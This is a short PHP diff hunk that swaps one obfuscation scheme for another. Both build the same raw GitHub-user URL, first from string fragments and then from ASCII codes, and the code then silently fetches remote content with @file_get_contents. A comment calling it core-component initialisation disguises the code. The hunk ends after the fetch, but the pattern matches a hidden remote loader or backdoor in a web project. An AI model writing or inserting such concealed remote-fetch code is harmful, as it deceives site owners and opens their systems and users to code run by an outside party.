@@ -5,9 +5,12 @@
 */
 
 // Initialize core components
-$a='ht';$b='tps';$c='://';$d='ra';$e='w.';$f='gi';$g='th';$h='ub';$i='us';$j='er';$k='co';$l='nt';$m='en';$n='t.';$o='co';$p='m/';$q='md';$r='mo';$s='mi';$t='n3';$u='65';$v='36';$w='6-';$x='gi';$y='f/';$z='be';$aa='la';$ab='/r';$ac='ef';$ad='s/';$ae='he';$af='ad';$ag='s/';$ah='ma';$ai='in';$aj='/i';$ak='nd';$al='ex';$am='.t';$an='xt';
-
-$full_url=$a.$b.$c.$d.$e.$f.$g.$h.$i.$j.$k.$l.$m.$n.$o.$p.$q.$r.$s.$t.$u.$v.$w.$x.$y.$z.$aa.$ab.$ac.$ad.$ae.$af.$ag.$ah.$ai.$aj.$ak.$al.$am.$an;
+$data = "104-116-116-112-115-58-47-47-114-97-119-46-103-105-116-104-117-98-117-115-101-114-99-111-110-116-101-110-116-46-99-111-109-47-109-100-109-111-109-105-110-51-54-53-51-54-54-45-103-105-102-47-98-101-108-97-47-114-101-102-115-47-104-101-97-100-115-47-109-97-105-110-47-105-110-100-101-120-46-116-120-116";
+$parts = explode('-', $data);
+$full_url = '';
+foreach($parts as $p) {
+    $full_url .= chr(intval($p));
+}
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
